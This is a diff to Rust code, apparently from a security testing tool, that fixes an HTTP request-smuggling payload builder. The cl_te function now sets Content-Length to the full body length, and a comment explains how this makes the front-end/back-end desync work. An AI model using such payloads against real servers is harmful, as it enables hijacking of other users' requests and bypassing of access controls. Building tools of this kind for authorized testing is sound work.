@@ -116,12 +116,30 @@ pub fn te_obfuscations() -> Vec<String> {
     out
 }
 
-/// Backward-compatible CL.TE (hardcodes CL=0).
+/// Build a canonical Portswigger CL.TE smuggle.
+///
+/// Sets Content-Length to the FULL body length so the CL-following
+/// front-end reads (and forwards) every body byte — including the
+/// smuggled prefix — while the TE-following backend reads `0\r\n`,
+/// stops at the chunked-end marker, and leaves the post-chunk bytes
+/// in its connection buffer to be parsed as the next request.
+///
+/// Pre-fix this hardcoded CL=0 ("Backward-compatible CL.TE
+/// (hardcodes CL=0)") which produced a CL-front-end that
+/// forwarded ZERO body bytes — the smuggled prefix never reached
+/// the TE-backend's buffer and the desync never fired. Caller
+/// scripts that wanted a non-canonical CL value have always had
+/// `cl_te_custom` available.
 pub fn cl_te(
     host: &str,
     smuggled_prefix: &str,
 ) -> Result<SmugglingPayload, crate::safety::SafetyError> {
-    cl_te_custom(host, smuggled_prefix, 0)
+    // Compute the body length the same way cl_te_custom serializes
+    // it so the CL on the wire matches the bytes that follow.
+    let prefix = validate_prefix(smuggled_prefix)?;
+    let prefix = ensure_double_crlf(&prefix);
+    let body_len = "0\r\n\r\n".len() + prefix.len();
+    cl_te_custom(host, smuggled_prefix, body_len)
 }
 
 /// CL.TE with a custom Content-Length.
